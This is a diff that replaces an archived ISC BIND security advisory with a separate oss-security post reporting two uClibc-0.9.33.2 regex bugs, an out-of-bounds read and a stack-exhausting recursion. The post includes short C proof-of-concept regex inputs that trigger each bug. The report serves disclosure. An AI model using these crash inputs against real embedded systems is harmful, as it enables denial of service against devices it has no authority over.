@@ -1,63 +1,87 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/14/4
-Message-ID: <d4e8f699-30e1-59f7-47f2-d78b42066728@isc.org>
-Date: Wed, 14 Jun 2017 18:31:00 -0500
-From: ISC Security Officer <security-officer@....org>
-To: oss-security@...ts.openwall.com
-Cc: ISC Security Officer <security-officer@....org>
-Subject: BIND9 CVE-2017-3140 & CVE-2017-3141
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/16/4
+Message-ID: <tencent_18C312B86EA079DA42B11D83@qq.com>
+Date: Fri, 16 Jun 2017 11:53:09 +0800
+From: "fefe" <qbenjin@...com>
+To: "oss-security" <oss-security@...ts.openwall.com>
+Subject: two vulns in  uClibc-0.9.33.2
 Content-Type: text/plain; charset=utf-8
 
-Today ISC announced CVE-2017-3140, CVE-2017-3141, and an operational
-notification regarding LMDB in BIND 9.11
+I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
 
 
-CVE-2017-3140 is a denial-of-service vulnerability affecting 9.9.10,
-9.10.5, 9.11.0->9.11.1, 9.9.10-S1, and 9.10.5-S1 when configured with
-Response Policy Zones (RPZ) utilizing NSIP or NSDNAME rules.
-
-We are aware that some subscribers to this list maintain BIND packages
-which have diverged from the official ISC code branches.  While we
-cannot always offer specific guidance, in the case of CVE-2017-3140
-maintainers who have selectively backported BIND changes are advised to
-check whether they have included change #4377, as that change has been
-determined to be a cause of CVE-2017-3140.
+one is about line 2682 of get_subexp.c :
 
 
-CVE-2017-3141 is a Windows privilege escalation vector affecting
-9.2.6-P2+, 9.3.2-P1+, 9.4.x, 9.5.x, 9.6.x, 9.7.x, 9.8.x, 9.9.0->9.9.10,
-9.10.0->9.10.5, 9.11.0->9.11.1, 9.9.3-S1->9.9.10-S1, and 9.10.5-S1.  The
-BIND Windows installer failed to properly quote the service paths,
-possibly allowing a local user to achieve privilege escalation, if
-allowed by file system permissions.
+		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
+		{
+		  /* If we are at the end of the input, we cannot match.  */
+		  if (bkref_str_off >= mctx->input.len)
+		    break;
 
 
-BIND 9.11.0 and 9.11.1 carries a number of integration problems with
-LMDB (liblmdb) that will be addressed in BIND 9.11.2, planned for
-release in July/August 2017.
+		  err = extend_buffers (mctx);
+		  if (BE (err != REG1_NOERROR, 0))
+		    return err;
 
 
-Our full CVE text can be found at:
+		  buf = (const char *) re_string_get_buffer (&mctx->input);
+		}
+	      if (buf [bkref_str_off++] != buf[sl_str - 1])
+		break; /* We don't need to search this sub expression
+		
+"bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read
 
-  https://kb.isc.org/article/AA-01495/74/CVE-2017-3140
-  https://kb.isc.org/article/AA-01496/74/CVE-2017-3141
 
-The full operational notification can be found at:
-
-  https://kb.isc.org/article/AA-01497/169/LMDB-integration-problems.html
-
-New releases of BIND, including security fixes for these
-vulnerabilities, are available at: http://www.isc.org/downloads/
-
-Release notes can be obtained using the following links:
-
-  ftp://ftp.isc.org/isc/bind9/9.9.10-P1/
-  ftp://ftp.isc.org/isc/bind9/9.10.5-P1/
-  ftp://ftp.isc.org/isc/bind9/9.11.1-P1/
-
-Brian Conry
-Security Officer
+The poc code like:
+	
+	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+	{		
+        	reg1match_t pmatch[1];
+		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
+		regfree(&regtmp);
+	}
 
 
 
-Download attachment "signature.asc" of type "application/pgp-signature" (456 bytes)
+
+
+
+The another is aout line 1837 of regexce.c :
+
+
+		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
+			     int subexp_idx, int from_node, int bkref_idx)
+                .......
+
+
+		  cpos =
+		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
+						 dst, bkref_idx);
+
+
+		
+check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.
+
+
+The poc code like:	
+	
+	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+	{		
+        	reg1match_t pmatch[1];
+		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
+		regfree(&regtmp);
+	}
+
+
+
+
+A large number of embedded devices uses uclibc instead of glibc.
+Could you assign CVE id for those?
+
+
+Thank you
+
+
+Benjin Liu
+Codesafe Team of Qihoo 360
